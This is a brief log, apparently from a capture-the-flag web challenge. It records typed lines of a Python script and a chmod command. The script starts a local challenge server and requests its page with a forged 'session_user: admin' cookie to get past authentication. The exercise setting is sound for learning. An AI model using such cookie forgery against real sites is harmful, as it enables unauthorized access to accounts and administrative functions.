-typed: '#!/usr/bin/env python3'
        'from pwn import *'
        'import requests'
        'context.log_level = 'error''
        'p = process("/challenge/server")'
        'time.sleep(1)'
        'url = "http://challenge.localhost/"'
        'cookies = {'
                '"session_user" : "admin"'
                '}'
        'r = requests.get(url, cookies=cookies)'
        'print(r.text)'
-ran: 'chmod a+x bro'
